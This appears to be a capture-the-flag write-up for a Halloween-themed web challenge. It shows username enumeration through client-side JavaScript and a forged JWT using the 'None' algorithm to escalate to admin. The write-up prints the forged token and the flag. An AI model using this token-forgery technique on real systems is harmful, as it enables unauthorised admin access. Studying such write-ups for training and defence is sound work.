# Checking the site

There are ghosts and witches flying around on a login page.

![](screenshots/1.png)

# Console

Opening the console in the browser reveals some debug messages.

```
[DEBUG] Backend URL: http://10.10.2.10:1337
[NOTE] The witches sometimes like to glitch. Let's be honest, they just like to party hard. BWAHAHAHA
```

# Debug

Looking for more of these debug logs in the JS files, there is one more:

```
[DEBUG] username seems valid
```

Inserting a breakpoint and updating the username input field stops on it.

![](screenshots/2.png)

The value `r` has a bunch of values. The JS is checking if the value in the input is in this array. These are the valid usernames.

# Login

We can log in with these users. The chosen is the `witch`.

![](screenshots/3.png)

This is calling the `/login` endpoint on the backend.

![](screenshots/4.png)

It has a JWT token.

```json
{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpdGNoIiwiaXNBZG0iOjAsImV4cCI6MTcwMDIzNTAzMX0.RwLppWYz6yObN4UTTQUuylVmDWQTIYZ5WRa1R8lXvxU", 
    "exp": 1700235031
}
```

# JWT token

Decoding the token can be done manually decoding the base64 or with [jwt.io](https://jwt.io/).

Header:

```
{"alg":"HS256","typ":"JWT"}
```

Payload:
```
{"username":"witch","isAdm":0,"exp":1700235031}
```

![](screenshots/5.png)

# None algorithm

For some reason, JWT tokens can be signed with the None algorithm, and insecure applications do accept them. Let's also edit the payload and flip `isAdm` and make it never expire.

The `=` padding has to be omitted for JWT tokens.

Header:

```
{"alg":"None","typ":"JWT"}
```

Payload:

```
{"username":"witch","isAdm":1,"exp":9999999999}
```

Response:

```json
{
    "token": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6IndpdGNoIiwiaXNBZG0iOjEsImV4cCI6OTk5OTk5OTk5OX0.", 
    "exp":9999999999
}
```

This logs us in with admin.

![](screenshots/6.png)

# Flag
`cq23{g0tta_c4tch_th3m_4ll_6d8441095772cfcf12a846450d}`